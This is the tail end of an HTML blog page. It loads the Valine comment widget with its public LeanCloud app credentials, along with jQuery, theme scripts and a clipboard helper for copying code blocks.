<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="//cdn.jsdelivr.net/gh/xcss/valine@v1.1.7/dist/Valine.min.js"></script>
<script type="text/javascript">
    new Valine({
        el: '#vcomments',
        notify: false,
        verify: false,
        app_id: "d2XJ52o9D5xTnDd2J92VPPna-gzGzoHsz",
        app_key: "P6wHC0f6Fn02hW8SSdnax8wa",
        placeholder: "Just go go",
        avatar: 'mm'
    });
</script>


    




  
    <script type="text/javascript" src="/lib/jquery/jquery-3.1.1.min.js"></script>
  

  

    <script type="text/javascript" src="/js/src/theme.js?v=1.1"></script>
<script type="text/javascript" src="/js/src/bootstrap.js?v=1.1"></script>

    <!-- 代码块复制功能 -->
  <script type="text/javascript" src="/js/src/clipboard.min.js"></script>  
  <script type="text/javascript" src="/js/src/clipboard-use.js"></script>
  </body>
</html>
